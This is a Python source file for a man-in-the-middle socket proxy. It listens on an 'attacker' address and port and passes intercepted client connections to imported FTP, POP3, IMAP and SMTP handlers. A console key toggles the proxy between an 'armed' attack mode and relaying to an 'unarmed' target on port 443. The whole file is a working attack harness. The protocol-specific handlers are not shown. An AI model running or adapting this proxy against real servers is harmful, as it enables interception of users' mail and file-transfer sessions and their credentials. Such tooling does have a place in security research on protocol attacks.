#!/usr/bin/python3
import socket

from _thread import *

from proxy.socket.protocols.ftp import FTPHandler
from proxy.socket.protocols.imap import IMAPHandler
from proxy.socket.protocols.imaps import IMAPSHandler
from proxy.socket.protocols.pop3 import POP3Handler
from proxy.socket.protocols.pop3s import POP3SHandler
from proxy.socket.protocols.smtp import SMTPHandler
from utils.common import AddressInfo
from utils.logging import _info

protocol_handler = {'FTP': FTPHandler, 'POP3': POP3Handler, 'POP3S': POP3SHandler, 'IMAP':IMAPHandler,'IMAPS':IMAPSHandler,  'SMTP': SMTPHandler}


class MITMSocketProxy:
    def __init__(self, attacker_ip, attacker_port, target_ip, target_port, protocol):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.unarmed_target_ip = target_ip
        self.unarmed_target_port = 443
        self.connections = []
        self.handler = protocol_handler[protocol](self.target_ip, self.target_port, self.unarmed_target_ip, self.unarmed_target_port)
        self.armed = False

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        start_new_thread(self.arm, ())
        try:
            s.bind((self.attacker_ip, self.attacker_port))
            s.listen(5)
            while True:
                client, address = s.accept()
                self.connections.append((client))
                addr = AddressInfo(ip=address[0], port=address[1])
                _info("mitmproxy.main", f"[{addr.ip}] Connection from {addr.ip}:{addr.port}")
                start_new_thread(self.handler.handle_connection, (addr, client, self.armed))

        finally:
            s.close()

    def arm(self):
        while True:
            x = input("Press key to toggle armed state")
            self.armed = not self.armed
            for x in self.connections:
                x.close()
            _info("mitmproxy ", f"ARMED STATE: {self.armed}")

